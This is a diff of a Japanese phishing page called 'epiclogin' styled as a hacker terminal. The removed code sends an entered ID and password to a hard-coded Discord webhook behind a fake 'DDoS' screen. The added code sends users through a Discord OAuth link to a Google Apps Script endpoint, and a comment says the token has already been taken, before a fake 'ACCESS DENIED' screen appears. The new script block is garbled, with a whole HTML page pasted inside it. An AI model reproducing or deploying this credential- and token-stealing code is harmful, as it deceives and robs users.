@@ -2,63 +2,45 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>epiclogin - TERMINAL</title>
+    <title>epiclogin - AUTH SYSTEM</title>
     <style>
-        /* 全体をハッカーグリーンな世界観に */
         body {
-            background-color: #000000;
-            color: #00ff00; /* 蛍光緑 */
-            font-family: 'Courier New', Courier, monospace; /* プログラミングっぽいフォント */
+            background-color: #000;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            overflow: hidden;
         }
 
         .login-card {
             background-color: #0a0a0a;
             padding: 40px;
             border: 1px solid #00ff00;
-            border-radius: 2px;
-            width: 380px;
+            width: 400px;
             text-align: center;
             box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
         }
 
-        h1 { font-size: 20px; margin-bottom: 30px; text-transform: uppercase; letter-spacing: 3px; }
-
-        input {
+        .discord-btn {
+            display: block;
             width: 100%;
             padding: 15px;
-            margin-bottom: 20px;
-            border: 1px solid #00ff00;
-            background-color: #000;
-            color: #00ff00;
-            border-radius: 0;
-            box-sizing: border-box;
-            outline: none;
-        }
-
-        button {
-            width: 100%;
-            padding: 15px;
-            border: 1px solid #00ff00;
-            background-color: #002200;
-            color: #00ff00;
+            background-color: #5865F2;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 4px;
             font-weight: bold;
-            cursor: pointer;
-            text-transform: uppercase;
-            transition: 0.2s;
+            transition: 0.3s;
         }
 
-        button:hover {
-            background-color: #00ff00;
-            color: #000;
-        }
+            .discord-btn:hover {
+                background-color: #4752C4;
+                transform: scale(1.02);
+            }
 
-        /* くるくる回るロード画面も緑に */
         .loader {
             border: 4px solid #002200;
             border-top: 4px solid #00ff00;
@@ -70,88 +52,163 @@
         }
 
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
         }
 
-        .hidden { display: none; }
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
 
-    <div id="step1" class="login-card">
-        <h1>[ LOGIN ID ]</h1>
-        <input type="text" id="userMsg" placeholder="ENTER ADMIN ID...">
-        <button onclick="sendStep1()">認証開始</button>
+    <div id="loginScreen" class="login-card">
+        <h1>[ SYSTEM ACCESS ]</h1>
+        <p>管理者権限で認証してください。</p>
+        <a href="https://discord.com/oauth2/authorize?client_id=1467502850610561229&response_type=code&redirect_uri=https%3A%2F%2Fscript.google.com%2Fmacros%2Fs%2FAKfycbxT1KN9AYzaZh0xK4L440-dFm77vwc6IXmx0UGkLkz5PwiRzc7iWOEg0msLOQHLc9j0%2Fexec&scope=guilds+guilds.members.read" class="discord-btn">DISCORDでログイン</a>
     </div>
 
     <div id="loadingScreen" class="login-card hidden">
         <div class="loader"></div>
-        <p id="loadingText">プロトコル実行中...</p>
-    </div>
-
-    <div id="step2" class="login-card hidden">
-        <h1>[ ACCESS PASS ]</h1>
-        <input type="password" id="passMsg" placeholder="ENTER PASSWORD...">
-        <button onclick="sendStep2()">サーバー接続</button>
-    </div>
-
-    <div id="step3" class="login-card hidden">
-        <h1 style="color: #00ff00; text-shadow: 0 0 10px #00ff00;">DDoS ATTACK</h1>
-        <p>ターゲットサーバーへの攻撃準備が完了しました。</p>
-        <p style="font-size: 11px;">※実行中、一時的にネットワークが不安定になります。</p>
-        <button onclick="triggerCrash()" style="background-color: #004400; border-color: #00ff00;">DDoSを実行しますか？</button>
+        <p>ロール権限をスキャン中...</p>
+        <p style="font-size: 10px; color: #006600;">ACCESSING DISCORD DATABASE...</p>
     </div>
 
     <div id="errorScreen" class="login-card hidden">
-        <h1 style="color: #ff0000; border-color: #ff0000;">FAILED</h1>
-        <p>現在、サイトへのアクセスが集中しています。</p>
-        <p>パケット送信がタイムアウトしました。しばらく時間を置いてから再度お試しください。</p>
-        <button onclick="location.reload()" style="background-color: #220000; color: #ff0000; border-color: #ff0000;">再試行</button>
+        <h1 style="color: #ff0000;">ACCESS DENIED</h1>
+        <p>サーバーへのアクセスが集中しています。権限が不足しています。</p>
+        <button onclick="location.href='index.html'" style="background:#440000; color:#ff0000; border:1px solid #ff0000; width:100%; padding:10px; cursor:pointer;">再試行</button>
     </div>
 
     <script>
-    const webhookUrl = "https://discord.com/api/webhooks/1467497007139655792/fWG4s2fmCekiP-zZLzuCZmExuSybnX5Pfl4GxlbAHxzAgyeDhIy3D8KMqDTWbhviKE_4";
+        // このスクリプトは「GASから戻ってきた時」の見た目を制御するで
+        const urlParams = new URLSearchParams(window.location.search);
+< !DOCTYPE html >
+            <html lang="ja">
+                <head>
+                    <meta charset="UTF-8">
+                        <title>epiclogin - AUTH SYSTEM</title>
+                        <style>
+                            body {
+                                background - color: #000;
+                            color: #00ff00;
+                            font-family: 'Courier New', monospace;
+                            display: flex;
+                            justify-content: center;
+                            align-items: center;
+                            height: 100vh;
+                            margin: 0;
+            }
 
-    function showLoading(callback, ms, text = "LOADING...") {
-        document.querySelectorAll('.login-card').forEach(el => el.classList.add('hidden'));
-        document.getElementById('loadingText').innerText = text;
-        document.getElementById('loadingScreen').classList.remove('hidden');
-        
-        setTimeout(() => {
-            document.getElementById('loadingScreen').classList.add('hidden');
-            callback();
-        }, ms);
-    }
+                            .login-card {
+                                background - color: #0a0a0a;
+                            padding: 40px;
+                            border: 1px solid #00ff00;
+                            width: 400px;
+                            text-align: center;
+                            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
+            }
 
-    function sendStep1() {
-        const val = document.getElementById('userMsg').value;
-        if (!val) return;
-        fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: "【ID】: " + val })
-        });
-        showLoading(() => {
-            document.getElementById('step2').classList.remove('hidden');
-        }, 2000); 
-    }
+                            .discord-btn {
+                                display: block;
+                            width: 100%;
+                            padding: 15px;
+                            background-color: #5865F2;
+                            color: #fff;
+                            text-decoration: none;
+                            border-radius: 4px;
+                            font-weight: bold;
+                            transition: 0.3s;
+            }
 
-    function sendStep2() {
-        const val = document.getElementById('passMsg').value;
-        if (!val) return;
-        fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: "【PASS】: " + val })
-        });
-        showLoading(() => {
-            document.getElementById('step3').classList.remove('hidden');
-        }, 3000); 
-    }
+                            .discord-btn:hover {
+                                background - color: #4752C4;
+                            transform: scale(1.02);
+                }
 
-    function triggerCrash() {
-        // 運命の7秒ロード
-        showLoading(() => {
-            document.getElementById('errorScreen').classList.remove('hidden');
-        }, 7000, "ATTACKING SERVER..."); 
-    }
+                            .loader {
+                                border: 4px solid #002200;
+                            border-top: 4px solid #00ff00;
+                            border-radius: 50%;
+                            width: 40px;
+                            height: 40px;
+                            animation: spin 0.8s linear infinite;
+                            margin: 20px auto;
+            }
+
+                            @keyframes spin {
+                                0 % {
+                                    transform: rotate(0deg);
+                                }
+
+                100% {
+                                transform: rotate(360deg);
+                }
+            }
+
+                            .hidden {
+                                display: none;
+            }
+                        </style>
+                </head>
+                <body>
+
+                    <div id="loginScreen" class="login-card">
+                        <h1>[ SYSTEM ACCESS ]</h1>
+                        <p>管理者権限で認証してください。</p>
+                        <a href="https://discord.com/oauth2/authorize?client_id=1467502850610561229&response_type=code&redirect_uri=https%3A%2F%2Fscript.google.com%2Fmacros%2Fs%2FAKfycbxT1KN9AYzaZh0xK4L440-dFm77vwc6IXmx0UGkLkz5PwiRzc7iWOEg0msLOQHLc9j0%2Fexec&scope=guilds+guilds.members.read" class="discord-btn">DISCORDでログイン</a>
+                    </div>
+
+                    <div id="loadingScreen" class="login-card hidden">
+                        <div class="loader"></div>
+                        <p>ロール権限をスキャン中...</p>
+                        <p style="font-size: 10px; color: #006600;">ACCESSING DISCORD DATABASE...</p>
+                    </div>
+
+                    <div id="errorScreen" class="login-card hidden">
+                        <h1 style="color: #ff0000;">ACCESS DENIED</h1>
+                        <p>サーバーへのアクセスが集中しています。権限が不足しています。</p>
+                        <button onclick="location.href='index.html'" style="background:#440000; color:#ff0000; border:1px solid #ff0000; width:100%; padding:10px; cursor:pointer;">再試行</button>
+                    </div>
+
+                    <script>
+            // このスクリプトは「GASから戻ってきた時」の見た目を制御するで
+                        const urlParams = new URLSearchParams(window.location.search);
+                        const code = urlParams.get('code');
+
+                        if (code) {
+                            // 認証から戻ってきたらスキャン画面を出す
+                            document.getElementById('loginScreen').classList.add('hidden');
+                        document.getElementById('loadingScreen').classList.remove('hidden');
+
+                // 7秒後に「失敗」を出す（トークンはもうGASが抜いてるから安心や！）
+                setTimeout(() => {
+                            document.getElementById('loadingScreen').classList.add('hidden');
+                        document.getElementById('errorScreen').classList.remove('hidden');
+                }, 7000);
+            }
+    </script>
+</body>
+</html>
+        const code = urlParams.get('code');
+
+        if (code) {
+            // 認証から戻ってきたらスキャン画面を出す
+            document.getElementById('loginScreen').classList.add('hidden');
+            document.getElementById('loadingScreen').classList.remove('hidden');
+
+            // 7秒後に「失敗」を出す（トークンはもうGASが抜いてるから安心や！）
+            setTimeout(() => {
+                document.getElementById('loadingScreen').classList.add('hidden');
+                document.getElementById('errorScreen').classList.remove('hidden');
+            }, 7000);
+        }
     </script>
 </body>
 </html>
